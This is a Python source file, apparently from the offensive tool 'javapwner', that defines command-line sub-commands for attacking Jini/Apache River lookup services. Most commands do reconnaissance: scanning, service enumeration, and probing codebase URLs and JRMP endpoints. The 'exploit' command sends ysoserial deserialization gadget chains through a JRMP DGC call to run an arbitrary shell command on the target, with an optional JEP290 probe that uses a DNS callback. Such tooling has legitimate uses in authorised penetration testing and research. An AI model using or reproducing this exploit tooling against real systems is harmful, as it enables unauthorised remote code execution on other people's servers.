"""Click sub-commands for the Jini / Apache River module.

Commands:
  javapwner jini scan    -t HOST [-p PORT]
  javapwner jini enum    -t HOST [-p PORT]
  javapwner jini exploit -t HOST [-p PORT] --gadget NAME --cmd CMD
  javapwner jini gadgets
"""

from __future__ import annotations

import sys

import click

from javapwner.core.output import OutputFormatter
from javapwner.exceptions import JavaPwnerError, PayloadError
from javapwner.protocols.jini.enumerator import JiniEnumerator
from javapwner.protocols.jini.exploiter import JiniExploiter
from javapwner.protocols.jini.probe import JiniProbe
from javapwner.protocols.jini.scanner import JiniScanner

DEFAULT_PORT = 4160


def _get_fmt(ctx: click.Context) -> OutputFormatter:
    return ctx.obj["formatter"]


def _get_timeout(ctx: click.Context) -> float:
    return ctx.obj.get("timeout", 5.0)


def _get_ysoserial(ctx: click.Context) -> str | None:
    return ctx.obj.get("ysoserial_path")


@click.group()
def jini() -> None:
    """Apache River / Jini protocol commands."""


# ---------------------------------------------------------------------------
# scan
# ---------------------------------------------------------------------------

@jini.command("scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the Jini lookup service.")
@click.pass_context
def scan_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Scan a Jini/Reggie endpoint for JRMP and Unicast Discovery."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    fmt.info(f"Scanning {target}:{port} ...")

    try:
        scanner = JiniScanner(timeout=timeout)
        result = scanner.scan(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    fmt.print_scan_result(result.to_dict())

    if result.raw_proxy_bytes:
        fmt.print_hex_dump(result.raw_proxy_bytes, label="Raw proxy bytes")

    if not result.is_open:
        fmt.warning(f"Port {port} appears closed or filtered.")
        sys.exit(1)

    if result.has_unicast_response:
        fmt.success("Jini Unicast Discovery confirmed — this looks like a Reggie.")
    elif result.is_jrmp:
        fmt.success("JRMP detected — Java RMI endpoint (may not be Reggie).")
    else:
        fmt.warning("No Jini/JRMP response detected.")


# ---------------------------------------------------------------------------
# enum
# ---------------------------------------------------------------------------

@jini.command("enum")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT")
@click.pass_context
def enum_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Enumerate services on a Jini/Reggie endpoint (Tier 1 heuristic)."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    fmt.info(f"Enumerating {target}:{port} (Tier 1 — heuristic) ...")

    try:
        enumerator = JiniEnumerator(timeout=timeout)
        result = enumerator.enumerate(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.groups:
        fmt.info(f"Groups    : {', '.join(result.groups)}")

    if result.urls:
        fmt.info("URLs found:")
        for url in result.urls:
            fmt.success(f"  {url}")

    if result.potential_services:
        fmt.print_services_table(result.potential_services)
    else:
        fmt.warning("No identifiable services found in the proxy blob.")

    if fmt.verbose and result.raw_strings:
        fmt.info("All extracted strings:")
        for s in result.raw_strings:
            fmt.debug(f"  {s!r}")


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------

@jini.command("exploit")
@click.option("-t", "--target", required=True, metavar="HOST")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
@click.option("--gadget", required=True, metavar="NAME",
              help="ysoserial gadget chain name (e.g. CommonsCollections6).")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.option("--jep290-probe", "jep290_probe", is_flag=True, default=False,
              help="Probe for JEP290 filters using URLDNS before exploiting.")
@click.option("--dns-url", default=None, metavar="URL",
              help="DNS callback URL for --jep290-probe (requires OOB listener).")
@click.pass_context
def exploit_cmd(ctx: click.Context, target: str, port: int, gadget: str,
                command: str, jep290_probe: bool, dns_url: str | None) -> None:
    """Deliver a ysoserial deserialization payload via JRMP DGC dirty call."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    try:
        exploiter = JiniExploiter(timeout=timeout, jar_path=jar)
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    # Optional JEP290 probe
    if jep290_probe:
        if not dns_url:
            fmt.error("--dns-url is required when using --jep290-probe")
            sys.exit(1)
        fmt.info(f"Probing for JEP290 filters on {target}:{port} ...")
        no_filter = exploiter.probe_jep290(target, port, dns_url)
        if no_filter:
            fmt.success("JEP290 probe: no serialization filter detected.")
        else:
            fmt.warning("JEP290 probe: filter detected — exploitation may fail.")

    fmt.info(f"Exploiting {target}:{port} with gadget '{gadget}' → {command!r}")

    result = exploiter.exploit(target, port, gadget, command)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    if result.likely_success:
        fmt.success("Payload delivered — no exception in response (likely executed).")
    elif result.exception_in_response:
        fmt.warning("TC_EXCEPTION in response — payload may have been filtered (JEP290?).")
    elif result.sent:
        fmt.info("Payload sent — no response received (blind execution).")
    else:
        fmt.error("Payload was not sent.")

    if fmt.verbose:
        fmt.print_hex_dump(result.response_bytes, label="Server response")


# ---------------------------------------------------------------------------
# gadgets
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# probe-codebase
# ---------------------------------------------------------------------------

@jini.command("probe-codebase")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT")
@click.pass_context
def probe_codebase_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Extract and probe codebase URLs from a Jini proxy blob."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    fmt.info(f"Probing codebase URLs on {target}:{port} ...")

    try:
        probe = JiniProbe(timeout=timeout)
        result = probe.probe_codebase(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.urls:
        fmt.warning("No codebase URLs found in proxy blob.")
        return

    for url in result.urls:
        reachable = result.reachable.get(url)
        if reachable:
            fmt.success(f"  [REACHABLE]   {url}")
            fmt.warning(f"  !! RMI codebase attack vector — {url} is accessible")
        else:
            fmt.info(f"  [UNREACHABLE] {url}")


# ---------------------------------------------------------------------------
# probe-endpoint
# ---------------------------------------------------------------------------

@jini.command("probe-endpoint")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT")
@click.pass_context
def probe_endpoint_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Extract embedded JRMP endpoints from proxy blob and confirm via handshake."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    fmt.info(f"Probing embedded endpoints on {target}:{port} ...")

    try:
        probe = JiniProbe(timeout=timeout)
        result = probe.probe_endpoint(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if not result.candidates:
        fmt.warning("No embedded endpoint candidates found.")
        return

    fmt.info(f"Candidates found ({len(result.candidates)}):")
    for c in result.candidates:
        tag = " [CONFIRMED — JRMP ACK]" if c == result.confirmed else ""
        fmt.info(f"  {c['host']}:{c['port']}{tag}")

    if result.confirmed is None:
        fmt.warning("No candidate responded to JRMP handshake.")
    else:
        fmt.success(
            f"Confirmed JRMP endpoint: {result.confirmed['host']}:{result.confirmed['port']}"
        )


# ---------------------------------------------------------------------------
# info
# ---------------------------------------------------------------------------

@jini.command("info")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT")
@click.pass_context
def info_cmd(ctx: click.Context, target: str, port: int) -> None:
    """Full recon: scan + enum + probe-codebase + probe-endpoint (single connection)."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    fmt.info(f"Running full recon on {target}:{port} ...")

    try:
        scanner = JiniScanner(timeout=timeout)
        scan_result = scanner.scan(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if not scan_result.is_open:
        fmt.warning(f"Port {port} appears closed or filtered.")
        sys.exit(1)

    try:
        enumerator = JiniEnumerator(timeout=timeout)
        enum_result = enumerator.enumerate(target, port, scan_result=scan_result)

        probe = JiniProbe(timeout=timeout)
        cb_result = probe.probe_codebase(target, port, scan_result=scan_result)
        ep_result = probe.probe_endpoint(target, port, scan_result=scan_result)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json({
            "scan": scan_result.to_dict(),
            "enum": enum_result.to_dict(),
            "probe_codebase": cb_result.to_dict(),
            "probe_endpoint": ep_result.to_dict(),
        })
        return

    # --- Scan summary ---
    if scan_result.has_unicast_response:
        fmt.success(f"Jini Unicast Discovery v{scan_result.unicast_version} confirmed (Reggie)")
    elif scan_result.is_jrmp:
        fmt.success("JRMP detected")
    else:
        fmt.warning("No Jini/JRMP response detected")

    if scan_result.groups:
        fmt.info(f"Groups        : {', '.join(scan_result.groups)}")

    # --- Enum summary ---
    if enum_result.potential_services:
        fmt.print_services_table(enum_result.potential_services)

    if enum_result.urls:
        fmt.info("TC_STRING URLs:")
        for url in enum_result.urls:
            fmt.info(f"  {url}")

    fmt.info(f"Nested streams: {enum_result.nested_stream_count}")

    # --- Codebase probe ---
    if cb_result.urls:
        fmt.info("Codebase URLs:")
        for url in cb_result.urls:
            reachable = cb_result.reachable.get(url)
            tag = "[REACHABLE]" if reachable else "[UNREACHABLE]"
            fmt.info(f"  {tag} {url}")
            if reachable:
                fmt.warning(f"  !! RMI codebase attack vector")

    # --- Endpoint probe ---
    if ep_result.confirmed:
        fmt.success(
            f"Confirmed JRMP endpoint: "
            f"{ep_result.confirmed['host']}:{ep_result.confirmed['port']}"
        )
    elif ep_result.candidates:
        fmt.info(f"Endpoint candidates (unconfirmed): {len(ep_result.candidates)}")


# ---------------------------------------------------------------------------
# gadgets
# ---------------------------------------------------------------------------

@jini.command("gadgets")
@click.pass_context
def gadgets_cmd(ctx: click.Context) -> None:
    """List available ysoserial gadget chains."""
    fmt = _get_fmt(ctx)
    jar = _get_ysoserial(ctx)

    try:
        from javapwner.core.payload import YsoserialWrapper
        wrapper = YsoserialWrapper(jar_path=jar)
        gadgets = wrapper.list_gadgets()
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json({"gadgets": gadgets})
        return

    if not gadgets:
        fmt.warning("No gadgets found — check ysoserial.jar version.")
        return

    fmt.success(f"Available gadgets ({len(gadgets)}):")
    for g in gadgets:
        fmt.info(f"  {g}")
